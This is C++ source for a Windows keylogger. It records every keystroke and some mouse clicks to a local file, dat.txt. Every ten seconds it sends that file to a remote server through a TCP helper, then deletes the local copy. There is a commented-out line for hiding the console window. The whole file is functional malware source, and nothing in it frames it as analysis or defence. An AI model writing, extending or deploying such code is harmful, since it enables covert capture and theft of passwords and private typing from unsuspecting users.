#define _WIN32_WINNT 0x0500

#include <Windows.h>
#include <string>
#include "TCP_send.h"
#include <iostream>
#include <fstream>
#include <conio.h>
#include <time.h>




using namespace std;
bool backspace_check = false;
fstream LogFile;
void LOG(string input) {
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		if (backspace_check) {
			LogFile.seekp(-1, std::ios_base::cur);
			backspace_check = false;
		}
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case 0xBE:
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("#SHIFT#\n");
		return true;
	case VK_BACK:
		backspace_check = true;
		return true;
	case VK_RBUTTON:
		LOG("#R_CLICK#\n");
		return true;
	default:
		return false;
	}
}



int main()
{
//	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	clock_t start, end;
	start = clock();
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}

		end = clock();
		if ((end - start) / CLOCKS_PER_SEC >= 10) {
			start = end;
			if (send_to_server("dat.txt") != 0)
				printf("[-] Fail sending keylog data\n\n");
			else {
				printf("[+] Success sending keylog data\n");
				printf("[*] Delete keylogfile\n");
				if (remove("dat.txt") == 0)
					printf("[+] Success delete keylog data\n\n");
				else
					printf("[-] Fail delete keylog data\n\n");
			}
		}
	}
	return 0;
}
